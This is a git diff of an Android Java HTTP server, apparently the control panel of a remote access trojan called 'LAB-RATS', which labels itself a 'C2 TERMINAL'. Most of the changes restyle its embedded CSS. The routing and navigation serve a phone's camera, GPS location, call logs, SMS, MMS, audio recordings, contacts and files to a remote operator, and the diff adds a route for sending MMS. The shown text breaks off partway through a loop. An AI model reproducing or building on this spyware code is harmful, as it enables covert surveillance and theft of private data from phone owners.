@@ -1,4 +1,4 @@
-package com.labs.k4n3co;
+package com.labs.labrats;
 
 import android.Manifest;
 import android.content.Context;
@@ -33,7 +33,7 @@ import java.util.Map;
 
 import fi.iki.elonen.NanoHTTPD;
 
-public class K4N3COHttpServer extends NanoHTTPD {
+public class LabRatsHttpServer extends NanoHTTPD {
 
     private final Context context;
 
@@ -42,15 +42,16 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "<head>" +
             "<meta charset=\"UTF-8\">" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
-            "<title>LAB-RATS | C2 TERMINAL</title>" +
+            "<title>Lab-RATS | C2 TERMINAL</title>" +
             "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
             ":root {" +
             "  --neon-cyan: #00f2ff;" +
-            "  --neon-magenta: #00f2ff;" +
             "  --neon-green: #39ff14;" +
+            "  --neon-yellow: #ffff00;" +
+            "  --neon-orange: #ff9d00;" +
             "  --bg-dark: #050505;" +
-            "  --bg-card: rgba(15, 15, 25, 0.8);" +
+            "  --bg-card: rgba(15, 15, 25, 0.9);" +
             "  --terminal-green: #00ff41;" +
             "  --danger: #ff3131;" +
             "}" +
@@ -59,9 +60,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "  font-family: 'JetBrains Mono', monospace;" +
             "  background: var(--bg-dark);" +
             "  background-image: " +
-            "    radial-gradient(circle at 50% 50%, rgba(0, 242, 255, 0.05) 0%, transparent 50%)," +
-            "    linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%)," +
-            "    linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));" +
+            "    radial-gradient(circle at 50% 50%, rgba(0, 242, 255, 0.03) 0%, transparent 50%)," +
+            "    linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.2) 50%)," +
+            "    linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));" +
             "  background-size: 100% 100%, 100% 4px, 3px 100%;" +
             "  min-height: 100vh;" +
             "  color: #e0e0e0;" +
@@ -72,7 +73,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "  display: block;" +
             "  position: fixed;" +
             "  top: 0; left: 0; bottom: 0; right: 0;" +
-            "  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));" +
+            "  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.08) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));" +
             "  z-index: 9999;" +
             "  pointer-events: none;" +
             "  background-size: 100% 2px, 3px 100%;" +
@@ -80,188 +81,169 @@ public class K4N3COHttpServer extends NanoHTTPD {
             ".container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }" +
             ".header {" +
             "  text-align: center;" +
-            "  padding: 40px 0;" +
-            "  border-bottom: 1px solid var(--neon-cyan);" +
-            "  margin-bottom: 30px;" +
-            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);" +
+            "  padding: 50px 0;" +
+            "  border-bottom: 1px solid rgba(0, 242, 255, 0.3);" +
+            "  margin-bottom: 40px;" +
             "  position: relative;" +
             "  overflow: hidden;" +
+            "  background: radial-gradient(circle at center, rgba(0, 242, 255, 0.05) 0%, transparent 70%);" +
             "}" +
             ".header h1 {" +
             "  font-family: 'Orbitron', sans-serif;" +
-            "  font-size: 3rem;" +
+            "  font-size: 3.5rem;" +
             "  color: var(--neon-cyan);" +
             "  text-transform: uppercase;" +
-            "  letter-spacing: 8px;" +
-            "  margin-right: -8px;" +
-            "  text-shadow: 0 0 10px var(--neon-cyan), 0 0 20px var(--neon-cyan);" +
-            "  margin-bottom: 10px;" +
-            "  animation: glitch 1s infinite alternate;" +
+            "  letter-spacing: 12px;" +
+            "  margin-right: -12px;" +
+            "  text-shadow: 0 0 15px rgba(0, 242, 255, 0.6);" +
+            "  margin-bottom: 15px;" +
+            "  animation: scanline 8s linear infinite;" +
             "}" +
-            "@keyframes glitch {" +
-            "  0% { transform: skew(0deg); }" +
-            "  20% { transform: skew(-1deg); text-shadow: 2px 0 var(--neon-cyan); }" +
-            "  40% { transform: skew(1deg); text-shadow: -2px 0 var(--neon-cyan); }" +
-            "  100% { transform: skew(0deg); }" +
-            "}" +
-            "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }" +
-            ".nav { display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; margin-bottom: 40px; }" +
+            "@keyframes scanline { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }" +
+            ".glitch-container { position: relative; margin-top: -10px; margin-bottom: 25px; }" +
+            ".glitch { color: #fff; font-size: 0.9rem; font-weight: bold; letter-spacing: 3px; text-transform: uppercase; position: relative; display: inline-block; }" +
+            ".glitch::before, .glitch::after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; }" +
+            ".glitch::before { left: 2px; text-shadow: -2px 0 var(--neon-cyan); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim 5s infinite linear alternate-reverse; }" +
+            ".glitch::after { left: -2px; text-shadow: -2px 0 var(--neon-red); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim2 5s infinite linear alternate-reverse; }" +
+            "@keyframes glitch-anim { 0% { clip: rect(31px, 9999px, 94px, 0); } 5% { clip: rect(70px, 9999px, 71px, 0); } 10% { clip: rect(29px, 9999px, 83px, 0); } 15% { clip: rect(16px, 9999px, 91px, 0); } 20% { clip: rect(2px, 9999px, 23px, 0); } 25% { clip: rect(67px, 9999px, 40px, 0); } 30% { clip: rect(56px, 9999px, 49px, 0); } 35% { clip: rect(28px, 9999px, 34px, 0); } 40% { clip: rect(82px, 9999px, 25px, 0); } 45% { clip: rect(21px, 9999px, 53px, 0); } 50% { clip: rect(44px, 9999px, 12px, 0); } 55% { clip: rect(13px, 9999px, 48px, 0); } 60% { clip: rect(54px, 9999px, 97px, 0); } 65% { clip: rect(51px, 9999px, 60px, 0); } 70% { clip: rect(93px, 9999px, 85px, 0); } 75% { clip: rect(38px, 9999px, 8px, 0); } 80% { clip: rect(10px, 9999px, 63px, 0); } 85% { clip: rect(11px, 9999px, 62px, 0); } 90% { clip: rect(87px, 9999px, 79px, 0); } 95% { clip: rect(49px, 9999px, 2px, 0); } 100% { clip: rect(3px, 9999px, 45px, 0); } }" +
+            "@keyframes glitch-anim2 { 0% { clip: rect(65px, 9999px, 100px, 0); } 5% { clip: rect(52px, 9999px, 64px, 0); } 10% { clip: rect(90px, 9999px, 73px, 0); } 15% { clip: rect(3px, 9999px, 95px, 0); } 20% { clip: rect(64px, 9999px, 70px, 0); } 25% { clip: rect(74px, 9999px, 4px, 0); } 30% { clip: rect(31px, 9999px, 17px, 0); } 35% { clip: rect(20px, 9999px, 35px, 0); } 40% { clip: rect(47px, 9999px, 9px, 0); } 45% { clip: rect(69px, 9999px, 69px, 0); } 50% { clip: rect(44px, 9999px, 5px, 0); } 55% { clip: rect(1px, 9999px, 81px, 0); } 60% { clip: rect(53px, 9999px, 26px, 0); } 65% { clip: rect(91px, 9999px, 11px, 0); } 70% { clip: rect(73px, 9999px, 100px, 0); } 75% { clip: rect(24px, 9999px, 17px, 0); } 80% { clip: rect(43px, 9999px, 90px, 0); } 85% { clip: rect(61px, 9999px, 1px, 0); } 90% { clip: rect(81px, 9999px, 2px, 0); } 95% { clip: rect(56px, 9999px, 1px, 0); } 100% { clip: rect(4px, 9999px, 54px, 0); } }" +
+            ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 40px; }" +
             ".nav a {" +
-            "  padding: 12px 25px;" +
-            "  background: transparent;" +
-            "  border: 1px solid var(--neon-cyan);" +
+            "  padding: 10px 20px;" +
+            "  background: rgba(0, 242, 255, 0.03);" +
+            "  border: 1px solid rgba(0, 242, 255, 0.2);" +
             "  color: var(--neon-cyan);" +
             "  text-decoration: none;" +
             "  text-transform: uppercase;" +
-            "  font-size: 0.8rem;" +
-            "  letter-spacing: 2px;" +
-            "  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);" +
-            "  position: relative;" +
-            "  overflow: hidden;" +
+            "  font-size: 0.75rem;" +
+            "  letter-spacing: 1.5px;" +
+            "  border-radius: 20px;" +
+            "  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);" +
             "}" +
             ".nav a:hover {" +
-            "  background: var(--neon-cyan);" +
-            "  color: var(--bg-dark);" +
-            "  box-shadow: 0 0 30px var(--neon-cyan);" +
+            "  background: rgba(0, 242, 255, 0.1);" +
+            "  border-color: var(--neon-cyan);" +
+            "  box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);" +
+            "  transform: translateY(-2px);" +
             "}" +
             ".card {" +
             "  background: var(--bg-card);" +
-            "  border-left: 4px solid var(--neon-magenta);" +
-            "  border-radius: 4px;" +
-            "  padding: 30px;" +
-            "  margin-bottom: 25px;" +
-            "  border-right: 1px solid rgba(255, 0, 255, 0.1);" +
-            "  border-top: 1px solid rgba(255, 0, 255, 0.1);" +
-            "  border-bottom: 1px solid rgba(255, 0, 255, 0.1);" +
-            "  backdrop-filter: blur(15px);" +
-            "  box-shadow: 10px 10px 20px rgba(0,0,0,0.5);" +
+            "  border: 1px solid rgba(255, 255, 255, 0.05);" +
+            "  border-radius: 12px;" +
+            "  padding: 35px;" +
+            "  margin-bottom: 30px;" +
+            "  backdrop-filter: blur(20px);" +
+            "  box-shadow: 0 20px 50px rgba(0,0,0,0.4), inset 0 1px 1px rgba(255,255,255,0.05);" +
             "  position: relative;" +
             "}" +
-            ".card::after {" +
-            "  content: \"SYS_READY\";" +
-            "  position: absolute;" +
-            "  top: 10px; right: 15px;" +
-            "  font-size: 0.6rem;" +
-            "  color: var(--neon-magenta);" +
-            "  opacity: 0.5;" +
+            ".card-node {" +
+            "  padding: 30px 20px;" +
+            "  border-radius: 12px;" +
+            "  text-decoration: none;" +
+            "  text-align: center;" +
+            "  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);" +
+            "  display: flex;" +
+            "  flex-direction: column;" +
+            "  align-items: center;" +
+            "  justify-content: center;" +
+            "  border: 1px solid rgba(255,255,255,0.05);" +
+            "  background: rgba(255,255,255,0.01);" +
+            "  position: relative;" +
+            "  overflow: hidden;" +
             "}" +
-            "h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 20px; color: var(--neon-cyan); }" +
-            "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; margin-top: 15px; }" +
-            "th { background: rgba(0, 242, 255, 0.1); color: var(--neon-cyan); text-transform: uppercase; font-size: 0.75rem; letter-spacing: 2px; padding: 15px; text-align: left; border-bottom: 2px solid var(--neon-cyan); }" +
-            "td { background: rgba(255,255,255,0.02); padding: 15px; font-size: 0.85rem; border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05); }" +
-            "tr:hover td { background: rgba(0, 242, 255, 0.05); color: var(--neon-cyan); }" +
-            ".file-item { display: flex; align-items: center; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-left: 3px solid var(--neon-cyan); margin: 10px 0; padding: 12px 15px; transition: all 0.3s; gap: 15px; }" +
-            ".file-item:hover { transform: translateX(10px); background: rgba(0, 242, 255, 0.05); border-color: var(--neon-cyan); }" +
-            ".info-item { background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1); padding: 15px; }" +
-            ".info-label { color: var(--neon-cyan); opacity: 0.7; font-size: 0.7rem; text-transform: uppercase; }" +
-            ".info-value { color: var(--neon-green); font-family: 'JetBrains Mono', monospace; }" +
+            ".card-node:hover {" +
+            "  transform: translateY(-10px) scale(1.02);" +
+            "  background: rgba(255,255,255,0.03);" +
+            "  box-shadow: 0 15px 30px rgba(0,0,0,0.5);" +
+            "}" +
+            ".card-node .icon {" +
+            "  font-size: 2.5rem;" +
+            "  margin-bottom: 15px;" +
+            "  transition: all 0.3s;" +
+            "}" +
+            ".card-node:hover .icon {" +
+            "  transform: scale(1.2);" +
+            "}" +
+            "h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; color: var(--neon-cyan); }" +
             "button, .btn {" +
             "  display: inline-block;" +
-            "  background: transparent;" +
+            "  background: rgba(57, 255, 20, 0.05);" +
             "  border: 1px solid var(--neon-green);" +
             "  color: var(--neon-green);" +
-            "  padding: 10px 20px;" +
+            "  padding: 12px 28px;" +
             "  text-transform: uppercase;" +
             "  letter-spacing: 2px;" +
             "  text-decoration: none;" +
+            "  border-radius: 30px;" +
+            "  font-weight: bold;" +
             "  transition: all 0.3s;" +
-            "  box-shadow: inset 0 0 0 0 var(--neon-green);" +
+            "  cursor: pointer;" +
             "}" +
-            "button:hover, .btn:hover { background: var(--neon-green); color: var(--bg-dark); box-shadow: 0 0 20px var(--neon-green); }" +
-            ".btn-small { padding: 6px 12px; font-size: 0.7rem; min-width: 80px; text-align: center; white-space: nowrap; }" +
-            ".empty-state { text-align: center; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }" +
-            ".empty-state .icon { color: var(--danger); text-shadow: 0 0 10px var(--danger); font-size: 3rem; margin-bottom: 20px; }" +
-            ".empty-state h2 { margin-bottom: 10px; }" +
-            ".empty-state p { opacity: 0.7; margin-bottom: 25px; }" +
-            ".glitch-text {" +
-            "  color: var(--neon-cyan);" +
-            "  font-size: 0.6rem;" +
-            "  letter-spacing: 3px;" +
-            "  margin-right: -3px;" +
-            "  text-transform: uppercase;" +
-            "  margin-top: 5px;" +
-            "  position: relative;" +
-            "  animation: subtle-glow 4s ease-in-out infinite;" +
-            "}" +
-            "@keyframes subtle-glow {" +
-            "  0%, 100% { opacity: 0.6; text-shadow: 0 0 2px var(--neon-cyan); }" +
-            "  50% { opacity: 1; text-shadow: 0 0 8px var(--neon-cyan); }" +
-            "}" +
-            "@media (max-width: 768px) {" +
-            "  .header h1 { font-size: 1.8rem; letter-spacing: 4px; }" +
-            "  .nav a { padding: 8px 12px; font-size: 0.7rem; }" +
-            "}" +
-            ".contact-avatar {" +
-            "  width: 40px; height: 40px;" +
-            "  border-radius: 50%;" +
-            "  background: linear-gradient(135deg, var(--neon-magenta), var(--neon-cyan));" +
-            "  display: flex; align-items: center; justify-content: center;" +
-            "  font-weight: bold; margin-right: 15px;" +
-            "  color: var(--bg-dark);" +
-            "  box-shadow: 0 0 10px rgba(255, 0, 255, 0.5);" +
-            "}" +
-            ".call-incoming { color: var(--neon-green); }" +
-            ".call-outgoing { color: var(--neon-cyan); }" +
-            ".call-missed { color: var(--danger); }" +
-            ".file-icon { width: 45px; height: 45px; min-width: 45px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; }" +
-            ".folder-icon { background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; color: #f39c12; }" +
-            ".file-icon-default { background: rgba(52, 152, 219, 0.2); border: 1px solid #3498db; color: #3498db; }" +
-            ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 25px; }" +
-            ".pagination a { padding: 8px 16px; background: var(--bg-card); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); text-decoration: none; }" +
-            ".pagination .active { background: var(--neon-cyan); color: var(--bg-dark); }" +
-            ".breadcrumb { display: flex; align-items: center; background: rgba(0,0,0,0.4); padding: 10px 20px; border-radius: 4px; margin-bottom: 20px; border: 1px solid rgba(0, 242, 255, 0.2); font-size: 0.8rem; overflow-x: auto; white-space: nowrap; }" +
-            ".breadcrumb a { color: var(--neon-cyan); text-decoration: none; padding: 2px 8px; border-radius: 3px; transition: background 0.2s; }" +
-            ".breadcrumb a:hover { background: rgba(0, 242, 255, 0.1); }" +
-            ".breadcrumb span { color: var(--neon-magenta); margin: 0 5px; font-weight: bold; }" +
-            ".file-list { list-style: none; display: grid; grid-template-columns: 1fr; gap: 10px; }" +
-            ".file-info { display: flex; flex-direction: column; flex: 1; min-width: 0; }" +
-            ".file-name { color: #fff; text-decoration: none; font-weight: bold; font-size: 0.95rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-bottom: 2px; }" +
-            ".file-name:hover { color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan); }" +
-            ".file-meta { font-size: 0.7rem; color: #888; font-family: 'JetBrains Mono', monospace; letter-spacing: 1px; }" +
-            ".file-icon-image { background: rgba(155, 89, 182, 0.2); border: 1px solid #9b59b6; color: #9b59b6; }" +
-            ".file-icon-video { background: rgba(231, 76, 60, 0.2); border: 1px solid #e74c3c; color: #e74c3c; }" +
-            ".file-icon-audio { background: rgba(26, 188, 156, 0.2); border: 1px solid #1abc9c; color: #1abc9c; }" +
-            ".file-icon-doc { background: rgba(46, 204, 113, 0.2); border: 1px solid #2ecc71; color: #2ecc71; }" +
-            ".watermark {" +
-            "  position: absolute;" +
-            "  top: 0;" +
-            "  left: 0;" +
-            "  width: 242px;" +
-            "  height: 182px;" +
-            "  background: url('/logo') no-repeat left center;" +
-            "  background-size: contain;" +
-            "  opacity: 0.10;" +
-            "  z-index: 0;" +
-            "  pointer-events: none;" +
-            "  filter: grayscale(100%) brightness(200%);" +
-            "}" +
+            "button:hover, .btn:hover { background: var(--neon-green); color: var(--bg-dark); box-shadow: 0 0 25px var(--neon-green); transform: translateY(-2px); }" +
+            ".info-item { background: rgba(0,0,0,0.4); border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }" +
+            ".info-label { color: var(--neon-cyan); opacity: 0.6; font-size: 0.65rem; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; flex-shrink: 0; }" +
+            ".info-value { color: #fff; font-family: 'JetBrains Mono', monospace; font-weight: bold; word-break: break-all; font-size: 0.9rem; }" +
+            ".info-section { margin-top: 30px; }" +
+            ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }" +
+            ".breadcrumb { margin-bottom: 25px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }" +
+            ".breadcrumb a { color: var(--neon-cyan); text-decoration: none; margin: 0 5px; }" +
+            ".breadcrumb span { color: #888; }" +
+            ".file-list { list-style: none; }" +
+            ".file-item { display: flex; align-items: center; padding: 15px; border: 1px solid rgba(255,255,255,0.05); background: rgba(0,0,0,0.2); border-radius: 8px; margin-bottom: 10px; transition: all 0.3s; }" +
+            ".file-item:hover { background: rgba(255,255,255,0.05); transform: translateX(5px); border-color: rgba(0, 242, 255, 0.3); }" +
+            ".file-icon { font-size: 1.5rem; margin-right: 20px; width: 40px; text-align: center; }" +
+            ".file-info { flex-grow: 1; }" +
+            ".file-name { color: #fff; text-decoration: none; font-weight: bold; display: block; margin-bottom: 4px; font-size: 0.9rem; }" +
+            ".file-meta { font-size: 0.7rem; color: #888; letter-spacing: 1px; }" +
+            ".btn-small { padding: 6px 15px; font-size: 0.65rem; border-radius: 20px; }" +
+            ".empty-state { text-align: center; padding: 60px 20px; }" +
+            ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; opacity: 0.2; color: var(--neon-cyan); }" +
+            "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; }" +
+            "th { text-align: left; padding: 15px; color: var(--neon-cyan); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; opacity: 0.7; }" +
+            "td { padding: 15px; background: rgba(255,255,255,0.03); border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05); }" +
+            "td:first-child { border-left: 1px solid rgba(255,255,255,0.05); border-radius: 8px 0 0 8px; }" +
+            "td:last-child { border-right: 1px solid rgba(255,255,255,0.05); border-radius: 0 8px 8px 0; }" +
+            ".call-incoming { color: var(--neon-green); text-shadow: 0 0 5px rgba(57, 255, 20, 0.4); }" +
+            ".call-outgoing { color: var(--neon-cyan); text-shadow: 0 0 5px rgba(0, 242, 255, 0.4); }" +
+            ".call-missed { color: var(--danger); text-shadow: 0 0 5px rgba(255, 49, 49, 0.4); }" +
+            ".pagination { display: flex; justify-content: center; align-items: center; margin-top: 40px; gap: 8px; }" +
+            ".pagination a { padding: 10px 18px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #fff; text-decoration: none; border-radius: 4px; font-size: 0.8rem; transition: all 0.3s; }" +
+            ".pagination a:hover, .pagination a.active { background: rgba(0, 242, 255, 0.1); border-color: var(--neon-cyan); color: var(--neon-cyan); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }" +
+            ".contact-avatar { width: 35px; height: 35px; background: rgba(0, 242, 255, 0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-weight: bold; font-size: 0.8rem; }" +
+            ".back-btn-container { margin-bottom: 25px; }" +
+            ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 4px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
+            ".btn-back:hover { background: var(--neon-cyan); color: var(--bg-dark); box-shadow: 0 0 15px var(--neon-cyan); }" +
+            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 90%; width: auto; z-index: 10000; opacity: 0.35; background: none; border: none; padding: 0; pointer-events: none; filter: drop-shadow(0 0 15px var(--neon-cyan)); }" +
             "</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
-            "<div class=\"header\">" +
-            "<div class=\"watermark\"></div>" +
-            "<h1>LAB-RATS</h1>" +
-            "<p style=\"color: var(--neon-cyan); font-size: 0.7rem; opacity: 0.6; letter-spacing: 5px; margin-right: -5px;\">REMOTE ACCESS TERMINAL V2.0.1</p>" +
-            "<div class=\"glitch-text\">Developed by K4N3CO.LABS</div>" +
-            "</div>" +
-            "<div class=\"nav\">" +
-            "<a href=\"/\">Terminal</a>" +
-            "<a href=\"/device\">Hardware</a>" +
-            "<a href=\"/camera\">Optics</a>" +
-            "<a href=\"/audio\">Acoustics</a>" +
-            "<a href=\"/files\">Data</a>" +
-            "<a href=\"/calls\">Comms</a>" +
-            "<a href=\"/sms\">SMS</a>" +
-            "<a href=\"/mms\">MMS</a>" +
-            "<a href=\"/contacts\">Contacts</a>" +
-            "</div>";
+            "  <div class=\"header\">" +
+            "    <img src=\"/logo\" class=\"watermark\" alt=\"LAB-RATS\">" +
+            "    <h1>LAB-RATS</h1>" +
+            "    <div class=\"glitch-container\">" +
+            "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
+            "    </div>" +
+            "    <div style=\"color: var(--neon-cyan); opacity: 0.6; font-size: 0.8rem; letter-spacing: 4px; margin-top: 5px; margin-bottom: 20px;\">C2_TERMINAL_INTERFACE_v7.9.2</div>" +
+            "  </div>" +
+            "  <div class=\"nav\">" +
+            "    <a href=\"/\">Terminal</a>" +
+            "    <a href=\"/device\">Hardware</a>" +
+            "    <a href=\"/files\">Data</a>" +
+            "    <a href=\"/camera\">Optics</a>" +
+            "    <a href=\"/gps\">Locate</a>" +
+            "    <a href=\"/calls\">Comms</a>" +
+            "    <a href=\"/sms\">SMS</a>" +
+            "    <a href=\"/mms\">MMS</a>" +
+            "    <a href=\"/audio\">Acoustics</a>" +
+            "    <a href=\"/contacts\">Contacts</a>" +
+            "  </div>";
 
     private static final String HTML_FOOTER = "</div>" +
             "</body>" +
             "</html>";
 
-    public K4N3COHttpServer(Context context, int port) {
+    public LabRatsHttpServer(Context context, int port) {
         super(port);
         this.context = context;
     }
@@ -286,6 +268,8 @@ public class K4N3COHttpServer extends NanoHTTPD {
                 return serveSmsMessages(params);
             } else if (uri.equals("/mms")) {
                 return serveMmsMessages(params);
+            } else if (uri.equals("/mms/send")) {
+                return sendMms(session);
             } else if (uri.startsWith("/mms/image/")) {
                 return serveMmsImage(uri.substring(11));
             } else if (uri.equals("/sms/send")) {
@@ -319,7 +303,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
             } else if (uri.equals("/gps")) {
                 return serveGpsPage();
             } else if (uri.equals("/gps/locate")) {
-                return serveGpsLocate();
+                return serveGpsLocate(params);
             } else if (uri.startsWith("/download/")) {
                 return serveDownload(uri);
             } else if (uri.equals("/audio")) {
@@ -376,9 +360,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
         
         // Server Status
-        html.append("<div style=\"padding: 20px; background: rgba(57, 255, 20, 0.05); border: 1px solid var(--neon-green); border-left-width: 5px; box-shadow: 0 0 10px rgba(57, 255, 20, 0.1);\">");
+        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
         html.append("<div class=\"info-label\">UPLINK_STATUS</div>");
-        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-green); text-shadow: 0 0 5px var(--neon-green);\">ONLINE</div>");
+        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan);\">ONLINE</div>");
         html.append("</div>");
         
         // Port
@@ -388,9 +372,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
         html.append("</div>");
         
         // IP
-        html.append("<div style=\"padding: 20px; background: rgba(255, 0, 255, 0.05); border: 1px solid var(--neon-magenta); border-left-width: 5px; box-shadow: 0 0 10px rgba(255, 0, 255, 0.1);\">");
+        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
         html.append("<div class=\"info-label\">VIRTUAL_ADDRESS</div>");
-        html.append("<div style=\"font-size: 1rem; font-weight: bold; color: var(--neon-magenta); word-break: break-all;\">").append(ipDisplay).append("</div>");
+        html.append("<div style=\"font-size: 1rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all;\">").append(ipDisplay).append("</div>");
         html.append("</div>");
         
         html.append("</div>");
@@ -399,25 +383,31 @@ public class K4N3COHttpServer extends NanoHTTPD {
         // Quick Access Terminal
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 25px;\">QUICK_ACCESS_NODES</h2>");
-        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px;\">");
+        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 20px;\">");
 
-        // Node definitions
-        String[][] nodes = {
-            {"/device", "Hardware", "&#128241;", "var(--neon-cyan)"},
-            {"/files", "Data", "&#128193;", "var(--neon-green)"},
-            {"/camera", "Optics", "&#128247;", "var(--neon-green)"},
-            {"/gps", "Locate", "&#128205;", "var(--danger)"},
-            {"/calls", "Comms", "&#128222;", "#ffff00"},
-            {"/sms", "SMS", "&#128233;", "var(--neon-cyan)"},
-            {"/mms", "MMS", "&#128444;", "var(--neon-magenta)"},
-            {"/audio", "Acoustics", "&#127908;", "#1abc9c"},
-            {"/contacts", "Contacts", "&#128101;", "#f39c12"}
+        // Node definitions with individual colors
+        Object[][] nodes = {
+            {"/device", "Hardware", "&#128241;", "var(--neon-cyan)", "rgba(0, 242, 255, 0.05)"},
+            {"/files", "Data", "&#128193;", "var(--neon-green)", "rgba(57, 255, 20, 0.05)"},
+            {"/camera", "Optics", "&#128247;", "var(--danger)", "rgba(255, 49, 49, 0.05)"},
+            {"/gps", "Locate", "&#128205;", "var(--neon-cyan)", "rgba(0, 242, 255, 0.05)"},
+            {"/calls", "Comms", "&#128222;", "var(--neon-yellow)", "rgba(255, 255, 0, 0.05)"},
+            {"/sms", "SMS", "&#128233;", "#3498db", "rgba(52, 152, 219, 0.05)"},
+            {"/mms", "MMS", "&#128444;", "#e67e22", "rgba(230, 126, 34, 0.05)"},
+            {"/audio", "Acoustics", "&#127908;", "#1abc9c", "rgba(26, 188, 156, 0.05)"},
+            {"/contacts", "Contacts", "&#128101;", "#f39c12", "rgba(243, 156, 18, 0.05)"}
         };
 
-        for (String[] node : nodes) {
-            html.append("<a href=\"").append(node[0]).append("\" style=\"padding: 25px 15px; background: rgba(255,255,255,0.02); border-radius: 4px; text-decoration: none; text-align: center; border: 1px solid ").append(node[3]).append("; opacity: 0.8; transition: all 0.3s;\">");
-            html.append("<div style=\"font-size: 2.2rem; margin-bottom: 15px; filter: drop-shadow(0 0 5px ").append(node[3]).append(");\">").append(node[2]).append("</div>");
-            html.append("<div style=\"color: ").append(node[3]).append("; font-weight: 600; font-size: 0.8rem; letter-spacing: 2px; text-transform: uppercase;\">").append(node[1]).append("</div>");
+        for (Object[] node : nodes) {
+            String link = (String)node[0];
+            String label = (String)node[1];
+            String icon = (String)node[2];
+            String color = (String)node[3];
+            String bgColor = (String)node[4];
+
